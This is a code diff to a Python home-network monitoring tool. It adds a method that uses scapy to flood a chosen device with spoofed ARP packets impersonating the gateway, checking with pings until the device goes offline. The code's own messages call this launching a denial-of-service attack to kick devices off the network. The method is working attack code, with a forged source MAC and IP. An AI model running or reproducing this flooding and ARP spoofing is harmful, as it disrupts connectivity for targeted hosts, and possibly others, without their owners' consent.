@@ -20,6 +20,8 @@ from plyer import notification
 import pyttsx3, threading
 
 
+# NETWORK IMPORTS
+from scapy.all import IP, send, UDP, ICMP, sr1flood, sr1, ARP, Ether, sendp, sendpfast
 
 
 class connection_status():
@@ -212,7 +214,7 @@ class utilities():
                 # FALL BACK TO GETTING MAC FROM PYTHON LIBARY // IN CASE OF RATE LIMITING ESPICIALLY
                 vendor = manuf.MacParser().get_manuf_long(mac) 
                 
-                vendor = vendor if vendor else "N/A"
+                vendor = vendor if vendor else "Not availiable"
 
                 return vendor
       
@@ -226,6 +228,61 @@ class utilities():
             vendor = manuf.MacParser().get_manuf_long(mac)
             return vendor
         
+    
+    def unauthorized_handler(self, ip, mac):
+        """Responsible for disallowing unauthorized devices found on the network"""
+
+        console.print(f"{ip} <---> {mac}")
+
+        #info = unauthorized_device.split('|')
+        #ip = info[2]
+
+        online = True
+        packets_sent = 0
+        total_packets = 0
+
+        payload = b"Intrusion Detected, you are not allowed on the network" * 20
+
+        packet_layer_3 = IP(src="192.168.1.1", dst=ip) / UDP(sport=1234, dport=80) / payload
+
+        # LAYER 2 PACKET // ARP
+        packet_layer_2 = Ether(src="4c:19:5d:15:76:8b", dst=mac) / ARP(psrc="192.168.1.1", pdst=ip) 
+
+        # NOTIFY USER THAT THE ATTACK IS STARTING
+        msg_start = f"Now launching a Denial-of-service attack on {ip}"
+        #threading.Thread(target=utilities().tts, args=(msg_start,)).start()
+
+        while online:
+
+            send(packet_layer_2, verbose=False)
+            
+            if packets_sent > 100000:
+
+                ping = IP(dst=ip) / ICMP()
+
+                response = sr1(ping, timeout=2)
+
+
+                if response:
+                    console.print(f"Device: {ip} is still online resuming Denial-of-Service attack")
+
+                else:
+                    msg = f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} sent"
+                    #utilities().tts(msg)
+                    console.print(f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} sent")
+                    online = False
+            
+                # RESPONSIBLE FOR KEEPING TRACK OFF TOTAL PACKETS SENT // RESTART PACKETS_SENT VARIABLE
+                total_packets += packets_sent
+                packets_sent = 0
+
+            
+            print(f"Packets sent: {packets_sent}", end='\r', flush=True)
+            packets_sent += 1
+    
+
+
+        
 
 
 def main():
@@ -233,6 +290,8 @@ def main():
     t = threading.Thread(target=utilities().tts("testing"))
     t.start()
     t.join()
+
+
         
 
 
